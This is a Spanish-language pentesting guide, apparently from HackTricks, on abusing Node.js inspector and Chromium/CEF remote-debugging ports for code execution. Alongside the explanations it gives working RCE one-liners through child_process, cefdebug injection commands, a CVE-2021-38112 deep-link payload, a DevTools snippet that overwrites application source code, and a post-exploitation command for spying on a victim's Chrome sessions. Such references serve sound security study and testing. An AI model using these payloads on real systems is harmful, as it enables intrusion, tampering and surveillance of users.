# Abuso de debugging de Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

## Información básica

[Según la documentación](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Cuando se inicia con el switch `--inspect`, un proceso de Node.js escucha a un cliente de debugging. De forma **predeterminada**, escuchará en el host y puerto **`127.0.0.1:9229`**. A cada proceso también se le asigna un **UUID** **único**.<sup>[[4]](#references)</sup>

Los clientes de Inspector deben conocer y especificar la dirección del host, el puerto y el UUID para conectarse. Una URL completa tendrá un aspecto similar a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Dado que el **debugger tiene acceso completo al entorno de ejecución de Node.js**, un actor malicioso capaz de conectarse a este puerto podría ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).

Existen varias formas de iniciar un inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Cuando inicias un proceso inspeccionado, aparecerá algo como esto:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Los procesos basados en **CEF** (**Chromium Embedded Framework**), como estos, necesitan usar el parámetro: `--remote-debugging-port=9222` para abrir el **debugger** (las protecciones contra **SSRF** siguen siendo muy similares). Sin embargo, en lugar de conceder una sesión de **debug** de **NodeJS**, se comunicarán con el navegador mediante el [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), una interfaz para controlar el navegador, pero no existe un **RCE** directo.<sup>[[5]](#references)</sup>

Cuando inicias un navegador con **debug** aparecerá algo como esto:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navegadores, WebSockets y same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador web pueden realizar solicitudes WebSocket y HTTP bajo el modelo de seguridad del navegador. Es necesaria una **conexión HTTP inicial** para **obtener un identificador de sesión de debugger único**. La **same-origin-policy** **impide** que los sitios web puedan realizar **esta conexión HTTP**. Como medida de seguridad adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica que los **encabezados 'Host'** de la conexión especifiquen exactamente una **dirección IP**, **`localhost`** o **`localhost6`**.<sup>[[12]](#references)</sup>

> [!TIP]
> Estas **medidas de seguridad impiden explotar el inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo que podría hacerse explotando una vulnerabilidad SSRF).

### Iniciar el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso de nodejs en ejecución para hacer que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas privilegios suficientes, por lo que esto podría concederte **acceso privilegiado a la información dentro del proceso**, pero no una escalada directa de privilegios.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Esto es útil en contenedores porque **apagar el proceso e iniciar uno nuevo** con `--inspect` **no es una opción**, ya que el **contenedor** será **eliminado** junto con el proceso.

### Conectarse al inspector/debugger

Para conectarse a un navegador basado en **Chromium**, se puede acceder a las URL `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón Configure, se debe comprobar que el **host y el puerto de destino** estén incluidos correctamente. La imagen muestra un ejemplo de Remote Code Execution (RCE):

![Después de una URL para acceder al debugger aparecerá. p. ej., ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectarse al inspector/debugger: Para conectarse a un navegador basado en Chromium,...](<../../images/image (674).png>)

Usando la **línea de comandos** puedes conectarte a un debugger/inspector con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectores** ejecutándose localmente e **inyectar código** en ellos.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Ten en cuenta que los exploits de **RCE de NodeJS** no funcionarán si estás conectado a un navegador mediante [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (debes revisar la API para encontrar cosas interesantes que hacer con él).

## RCE en el Debugger/Inspector de NodeJS

> [!TIP]
> Si has llegado aquí buscando cómo obtener [**RCE desde un XSS en Electron, consulta esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algunas formas comunes de obtener **RCE** cuando puedes conectarte a un **inspector** de Node consisten en usar algo como lo siguiente (parece que esto **no funcionará en una conexión al Chrome DevTools protocol**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads del Chrome DevTools Protocol

Puedes consultar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
En esta sección simplemente enumeraré cosas interesantes que he encontrado que otras personas han usado para explotar este protocolo.

### Parameter Injection via Deep Links

En [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security descubrió que una aplicación basada en CEF **registró una URI** personalizada en el sistema (workspaces://index.html) que recibía la URI completa y después **inició la aplicació**n basada en CEF con una configuración que se construía parcialmente a partir de esa URI.<sup>[[8]](#references)</sup>

Se descubrió que los parámetros de la URI se decodificaban mediante URL y se utilizaban para iniciar la aplicación básica basada en CEF, lo que permitía a un usuario **inyectar** el flag **`--gpu-launcher`** en la **command line** y ejecutar acciones arbitrarias.

Por tanto, un payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Ejecutará un calc.exe.

### Sobrescribir archivos

Cambia la carpeta donde se van a guardar los **archivos descargados** y descarga un archivo para **sobrescribir** el **código fuente** utilizado frecuentemente por la aplicación con tu **código malicioso**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

Según este post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), es posible obtener RCE y realizar exfiltration de páginas internas de theriver.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

En un entorno real y **después de comprometer** un PC de usuario que utiliza un navegador basado en Chrome/Chromium, podrías iniciar un proceso de Chrome con la **depuración activada y hacer port-forward del puerto de depuración** para poder acceder a él. De esta forma, podrás **inspeccionar todo lo que la víctima haga con Chrome y robar información sensible**.<sup>[[7]](#references)</sup>

La forma sigilosa consiste en **terminar todos los procesos de Chrome** y después llamar a algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referencias

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - herramienta de inspección y explotación del debugger de CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution en Visual Studio Code mediante Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guía de debugging de Node.js - Primeros pasos](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup de corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusando de la función de debugging de Chrome para observar y controlar sesiones de navegación remotamente](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution en AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [¿Estás hablando conmigo? - WebDriver RCE mediante DNS Rebinding y CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter WebDriver - De Bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
